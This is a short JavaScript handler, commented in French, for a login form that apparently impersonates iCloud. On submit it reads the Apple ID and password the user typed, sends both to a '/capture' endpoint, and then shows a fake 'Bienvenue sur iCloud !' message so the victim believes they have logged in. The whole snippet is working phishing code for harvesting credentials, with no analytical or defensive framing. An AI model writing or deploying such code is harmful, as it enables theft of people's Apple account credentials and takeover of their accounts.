document.querySelector(".login-form").addEventListener("submit", function(event) {
    event.preventDefault();
    
    // Récupérer l'identifiant et le mot de passe
    const appleId = document.querySelector('input[type="text"]').value;
    const password = document.querySelector('input[type="password"]').value;
    const interaction = `Tentative de connexion avec identifiant : ${appleId}`;

    // Envoyer l'interaction au serveur
    fetch('/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ interaction, appleId, password })
    })
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Erreur:', error));

    alert("Bienvenue sur iCloud !");
});
